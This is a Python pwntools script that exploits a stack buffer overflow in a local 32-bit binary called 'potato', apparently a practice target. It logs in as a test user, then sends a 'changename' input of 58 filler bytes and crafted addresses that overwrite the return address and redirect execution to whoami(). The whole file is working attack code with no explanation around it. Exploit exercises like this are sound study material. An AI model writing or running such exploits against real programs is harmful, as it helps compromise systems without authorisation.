#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato2/potato")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"changename")
# fill 62 bytes with "A", then overwrite the return address with the address of whoami().
payload=b"\x41"*58 + b"\x38\xce\xff\xff" + p32(0x0804b108)
p.sendline(payload)

p.interactive()
